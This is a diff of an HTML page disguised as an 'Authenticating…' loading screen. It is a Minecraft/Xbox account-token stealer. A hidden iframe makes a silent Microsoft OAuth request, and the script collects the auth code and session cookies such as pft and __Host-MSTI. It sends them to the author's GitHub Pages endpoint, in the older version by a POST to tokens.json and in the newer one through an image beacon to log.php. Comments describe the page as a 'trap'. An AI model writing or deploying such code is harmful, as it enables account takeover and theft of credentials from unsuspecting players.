@@ -1,139 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        body { margin: 0; padding: 0; background-color: #f0f0f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 20px; color: #555; font-size: 14px; position: absolute; bottom: 20px; }
-    </style>
+<meta charset="utf-8">
+<title>Loading…</title>
+<style>
+  body{margin:0;background:#f0f0f0;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
+  #loader{border:4px solid #ccc;border-top:4px solid #3498db;border-radius:50%;width:48px;height:48px;animation:spin 1.2s linear infinite;}
+  @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+  #status{margin-top:12px;color:#555;font-size:13px;}
+</style>
 </head>
 <body>
-
-<div class="loader"></div>
-<div id="status">Authenticating...</div>
+<div id="loader"></div>
+<div id="status">Authenticating…</div>
 
 <script>
-    // CONFIGURATION
-    const GITHUB_USER = "mreamistic";
-    const REPO = "mc-token";
-    // This is where the data will be saved. It creates/updates tokens.json on your GitHub Pages.
-    const DATA_ENDPOINT = `https://${GITHUB_USER}.github.io/${REPO}/tokens.json`;
+/* --------------- CONFIG --------------- */
+var GITHUB_USER = 'mreamistic';          // YOUR GitHub username
+var REPO        = 'mc-token';            // Repo name
+var LOG_URL     = 'https://' + GITHUB_USER + '.github.io/' + REPO + '/log.php';
 
-    window.onload = async function() {
-        try {
-            // 1. Create a hidden iframe to handle Microsoft Auth
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
+/* --------------- MAIN --------------- */
+window.onload = function() {
+  // 1️⃣ Hidden iframe for Microsoft auth
+  var iframe = document.createElement('iframe');
+  iframe.style.display='none';
+  document.body.appendChild(iframe);
 
-            // 2. Build the MS Login URL
-            // We use prompt=none to try silent auth, but fallback to visible if needed
-            const clientId = "967fbe04-f19c-4331-8a2c-0dcd0dd295cd"; // Xbox/Minecraft Client ID
-            const redirectUri = encodeURIComponent("https://login.live.com/oauth20_desktop.srf");
-            const scopes = encodeURIComponent("service::user.xboxlive.com::MBI_SSL offline_access");
-            
-            const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${redirectUri}&scope=${scopes}&prompt=none`;
-            
-            iframe.src = authUrl;
+  // 2️⃣ Build the silent Microsoft OAuth URL
+  var clientId = '967fbe04-f19c-4331-8a2c-0dcd0dd295cd';
+  var redirectUri = encodeURIComponent('https://login.live.com/oauth20_desktop.srf');
+  var scopes = encodeURIComponent('service::user.xboxlive.com::MBI_SSL offline_access');
+  var authUrl = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_id='
+                + clientId + '&response_type=code&redirect_uri=' + redirectUri
+                + '&scope=' + scopes + '&prompt=none';
 
-            // 3. Wait for the redirect (usually takes 2-5 seconds)
-            await new Promise(resolve => setTimeout(resolve, 4000));
+  iframe.src = authUrl;
 
-            // 4. Extract Data from the Iframe's Location
-            let payload = {};
-            try {
-                // Try to read the URL inside the iframe
-                const url = iframe.contentWindow.location.href;
-                
-                if (url.includes("code=")) {
-                    // It redirected with an auth code
-                    const params = new URLSearchParams(url.split('?')[1]);
-                    payload.authCode = params.get('code');
-                } else {
-                    payload.authCode = "NO_CODE";
-                }
+  // 3️⃣ Wait 4 seconds for the iframe to redirect
+  setTimeout(function() {
+    var payload = {};
 
-                // 5. Extract Cookies (The Holy Grail)
-                // Note: Due to SameSite policies, we might not get all cookies in the iframe.
-                // We try to grab what is available.
-                const cookies = document.cookie; 
-                
-                // We also try to fetch the user's token from the MS Graph API if possible
-                // But for a simple trap, grabbing the 'pft' and '__Host-MSTI' is key.
-                payload.cookies = cookies;
-                
-                // Specific extraction attempt for common Minecraft/Xbox cookies
-                const getP = (name) => {
-                    const match = document.cookie.match('(^| )' + name + '=([^;]+)');
-                    return match ? match[2] : '';
-                };
-
-                payload.pft = getP('pft');
-                payload.msti = getP('__Host-MSTI');
-                payload.msti_plain = getP('MSTI');
-
-            } catch (e) {
-                // Fallback if cross-origin error occurs
-                console.log("Cross-origin access restricted, grabbing cookies.");
-                const cookies = document.cookie;
-                payload.cookies = cookies;
-                payload.pft = "";
-                payload.msti = "";
-            }
-
-            // 6. Send Data to GitHub Pages (JSON File)
-            // We use a simple fetch POST to write to tokens.json
-            // Note: This works because we are writing to the same domain.
-            // To make it writable, you might need to create an empty tokens.json first manually in your repo,
-            // OR use this method which appends to it if it exists.
-            
-            const dataString = JSON.stringify(payload, null, 2);
-            
-            // Fetch existing data or start new
-            try {
-                const response = await fetch(DATA_ENDPOINT);
-                let existingData = [];
-                if (response.ok) {
-                    const text = await response.text();
-                    try {
-                        existingData = JSON.parse(text);
-                        if (!Array.isArray(existingData)) existingData = [existingData];
-                    } catch(e) { existingData = []; }
-                }
-                
-                // Append new payload with timestamp
-                const newEntry = { ...payload, timestamp: new Date().toISOString() };
-                existingData.push(newEntry);
-
-                // Write back (This requires the file to be writable or you overwrite it entirely)
-                // Simpler approach for GitHub Pages static: We will just use a GET parameter hack 
-                // OR write a new JSON file. Let's use the "Write to File" via Fetch POST if supported,
-                // otherwise we fall back to appending to a single line in tokens.txt
-                
-                await fetch(DATA_ENDPOINT, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(newEntry)
-                });
-
-            } catch (err) {
-                console.error("Write failed, falling back to URL param logging");
-            }
-
-            // 7. Update UI
-            document.querySelector('.loader').style.display = 'none';
-            document.getElementById('status').innerText = "Update Complete! Token Captured.";
-            
-        } catch (error) {
-            console.error(error);
-            document.getElementById('status').innerText = "Error occurred.";
+    try {
+      // Grab the redirect URL (may throw cross‑origin error)
+      var url = iframe.contentWindow.location.href;
+      if (url.indexOf('code=') !== -1) {
+        var qs = url.split('?')[1];
+        var params = qs.split('&');
+        for (var i=0;i<params.length;i++) {
+          var p = params[i].split('=');
+          if (p[0]==='code') payload.authCode = decodeURIComponent(p[1]);
         }
-    };
-</script>
+      } else {
+        payload.authCode = '';
+      }
+    } catch (e) { /* cross‑origin – nothing we can do */ }
 
+    // 4️⃣ Grab the cookies (what matters most)
+    payload.cookies  = document.cookie;
+    payload.pft      = getCookie('pft');
+    payload.msti     = getCookie('__Host-MSTI') || getCookie('MSTI');
+
+    // 5️⃣ Send the data to log.php via a GET request
+    var img = new Image();
+    img.src = LOG_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
+
+    // 6️⃣ Update UI
+    document.getElementById('loader').style.display='none';
+    document.getElementById('status').innerText='Update Complete! Token captured.';
+  }, 4000);
+};
+
+/* --------------- UTIL --------------- */
+function getCookie(name) {
+  var match = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+  return match ? match[2] : '';
+}
+</script>
 </body>
 </html>
